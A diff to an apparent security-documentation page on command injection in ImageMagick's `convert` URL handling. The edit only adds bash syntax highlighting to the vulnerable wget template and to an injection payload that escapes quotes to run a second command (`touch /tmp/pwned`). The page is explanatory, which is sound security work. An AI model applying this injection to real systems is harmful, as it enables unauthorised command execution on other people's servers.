@@ -20,7 +20,7 @@ Site about this vulnerability, explaining all different impacts and more details
 When providing `convert` with an input, it is possible to use a **URL** that will be fetched by it. It does so using the following command template:
 
 {% code title="Vulnerable template" %}
-```
+```bash
 "wget" -q -O "%o" "https:%M"
 ```
 {% endcode %}
@@ -28,7 +28,7 @@ When providing `convert` with an input, it is possible to use a **URL** that wil
 Here, `%M` is the input URL, which can be command-injected by either command substitution or simply escaping the `"` quotes:
 
 {% code title="Payload" %}
-```
+```bash
 https://example.com"|touch "/tmp/pwned
 ```
 {% endcode %}
